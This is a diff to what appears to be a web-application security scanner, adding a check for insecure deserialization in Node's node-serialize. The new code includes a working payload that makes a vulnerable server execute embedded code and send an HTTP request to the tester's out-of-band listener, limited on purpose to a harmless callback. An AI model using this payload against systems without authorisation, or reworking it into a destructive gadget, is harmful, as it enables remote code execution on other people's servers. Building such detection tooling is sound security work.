@@ -585,6 +585,25 @@ def _xxe(routes, ctx):
                            f"XML external entity resolved via the body of {method} {r.path}", ex, detail, "high")
 
 
+# Insecure deserialization: a serialized blob whose deserialization has a side effect we can observe.
+# To stay non-destructive (RoE) we do NOT use an RCE/command gadget — the payload only makes the server
+# fetch our one-time loopback listener (an HTTP GET), so the OOB callback proves the blob was deserialized
+# and its embedded code ran, with no file/process impact. This is the node-serialize form (the common
+# Express sink, e.g. DVNA's bulk import): unserialize() with eval runs the IIFE. {OOB_URL} is substituted
+# by the runner. Other formats (python pickle, java) need their own gadget bytes — follow-up; pickle in
+# particular embeds the URL inside opaque bytes, so it needs a custom-OOB variant, not {OOB_URL}.
+_NODE_DESER_PAYLOAD = '{"kvch":"_$$ND_FUNC$$_function(){require(\'http\').get(\'{OOB_URL}\')}()"}'
+
+
+def _deserialization(routes, ctx):
+    """Confirm insecure deserialization by OOB callback: inject a node-serialize payload that, when
+    deserialized, fetches our listener. Only fires where the route actually deserializes untrusted input
+    with code execution — a safe JSON parse never calls out, so no false positive. Targeted (a flagged
+    route), so it is in _CLASS_FAMILY but not the blast-everything _FAMILIES."""
+    yield from _marker_family(routes, ctx, "insecure-deserialization", _NODE_DESER_PAYLOAD,
+                              {"oob_marker": "{OOB_MARKER}"}, "CWE-502", "A08:2021", oob=True, severity="critical")
+
+
 _FAMILIES = [_data_exposure, _injection, _bola, _bola_setup, _enumeration, _mass_assignment,
              _open_redirect, _ssrf, _command_injection, _path_traversal, _reflected_xss]
 
@@ -594,6 +613,7 @@ _CLASS_FAMILY = {
     "sql-injection": _injection, "nosql-injection": _injection, "injection": _injection,
     "xss": _reflected_xss, "command-injection": _command_injection, "path-traversal": _path_traversal,
     "ssrf": _ssrf, "open-redirect": _open_redirect, "xxe": _xxe,
+    "insecure-deserialization": _deserialization,
 }
 
 
